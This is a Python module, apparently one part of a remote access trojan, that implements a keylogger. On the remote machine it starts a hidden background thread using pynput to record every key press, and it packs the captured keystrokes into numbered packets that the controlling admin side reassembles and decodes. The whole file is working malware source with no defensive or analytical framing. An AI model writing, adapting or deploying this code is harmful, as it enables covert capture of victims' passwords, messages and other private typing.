import threading
import queue
import struct
import time

from RATFunction.RATFunction import RATFunction, Side
from Constants import PACKET_SIZE

from pynput import keyboard


class MyLogging(RATFunction):
    # packet_id | size | is_last | buffer
    keystroke_chunk_packet_struct = struct.Struct(f"I I I {PACKET_SIZE - 4 - 4 - 4}s")

    def __init__(self, side, packet_queue):
        super().__init__(side, packet_queue)

        self.keystroke_queue = queue.Queue()
        self.received_keystrokes_callback = lambda keystrokes: ()

        if side == Side.REMOTE_SIDE:
            threading.Thread(target=self._keylogger_worker, daemon=True).start()

    def handle_packet_admin_side(self, data):
        packet_id, size, last_flag, buffer = self.keystroke_chunk_packet_struct.unpack(data)
        self.keystroke_queue.put(buffer[:size])

        if last_flag:
            keystrokes = self.build_keystrokes()
            self.received_keystrokes_callback(keystrokes)

    def build_keystrokes(self):
        keystrokes = b''
        queue_size = self.keystroke_queue.qsize()
        for i in range(queue_size):
            keystrokes += self.keystroke_queue.get()

        return keystrokes.decode()

    def handle_packet_remote_side(self, data):
        pass

    def send_keystrokes(self, keystrokes: str):
        offset = 0
        max_chunk_size = PACKET_SIZE - 12
        while offset < len(keystrokes.encode()):
            chunk = keystrokes.encode()[offset:offset + max_chunk_size]
            is_last = 1 if len(chunk) < max_chunk_size else 0

            packet = self.keystroke_chunk_packet_struct.pack(self.identifier(), len(chunk), is_last, chunk)
            self.packet_queue.put(packet)

            offset += len(chunk)

    def identifier(self) -> int:
        return 3

    def _on_press(self, key):
        try:
            self.keystroke_queue.put(key.char.encode())
        except AttributeError:
            self.keystroke_queue.put(str(key).encode())

    def _keylogger_worker(self):
        with keyboard.Listener(on_press=self._on_press) as listener:
            listener.join()
